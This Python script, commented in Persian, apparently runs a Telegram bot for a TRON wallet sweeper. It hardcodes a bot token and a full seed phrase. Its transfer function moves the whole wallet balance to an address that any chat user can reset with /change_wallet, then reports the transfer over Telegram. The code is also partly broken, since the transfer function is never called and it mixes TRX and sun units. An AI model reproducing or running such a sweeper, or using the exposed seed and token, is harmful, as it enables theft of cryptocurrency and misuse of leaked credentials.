import requests
from tronpy import Tron
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext

# توکن بات تلگرام
TELEGRAM_TOKEN = "7229247937:AAF9VJE_aI0iSkxredfbh_JjdREArOAjUaI"

# seed phrase اولیه
seed_phrase = "visual eternal artefact burden tree wife sauce panther umbrella sail draw smart"
target_address = "TQ9QJFh4TnPAdKStJPd2hu4L5B89agXrTq"

def send_telegram_message(chat_id, message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': message
    }
    requests.post(url, data=payload)

def get_balance(wallet):
    client = Tron()
    balance = client.get_account(wallet.address).get('balance', 0)
    return balance / 1_000_000  # تبدیل به TRX

def start(update: Update, context: CallbackContext):
    update.message.reply_text("سلام! از دستورات زیر استفاده کنید:\n"
                              "/wallet_balance - نمایش موجودی\n"
                              "/change_wallet <آدرس جدید> - تغییر آدرس ولت")

def wallet_balance(update: Update, context: CallbackContext):
    client = Tron()
    wallet = client.from_mnemonic(seed_phrase)
    
    balance = get_balance(wallet)
    update.message.reply_text(f"موجودی ولت: {balance} TRX")

def change_wallet(update: Update, context: CallbackContext):
    global target_address
    if len(context.args) == 1:
        target_address = context.args[0]
        update.message.reply_text(f"آدرس ولت جدید تنظیم شد: {target_address}")
    else:
        update.message.reply_text("لطفاً آدرس جدید را وارد کنید.")

def transfer_tron():
    global target_address
    client = Tron()
    wallet = client.from_mnemonic(seed_phrase)

    balance = get_balance(wallet)

    if balance > 0:
        tx = (
            client.trx.transfer(wallet.address, target_address, balance)
            .build()
            .sign(wallet)
        )
        result = tx.broadcast()
        
        message = f"انتقال {balance} TRX به آدرس {target_address} انجام شد."
        send_telegram_message("YOUR_CHAT_ID", message)
        
        print("انتقال انجام شد:", result)
    else:
        print("موجودی صفر است، هیچ انتقالی انجام نمی‌شود.")

def main():
    updater = Updater(TELEGRAM_TOKEN)
    
    # ثبت دستورات
    updater.dispatcher.add_handler(CommandHandler("start", start))
    updater.dispatcher.add_handler(CommandHandler("wallet_balance", wallet_balance))
    updater.dispatcher.add_handler(CommandHandler("change_wallet", change_wallet))

    # شروع بات
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()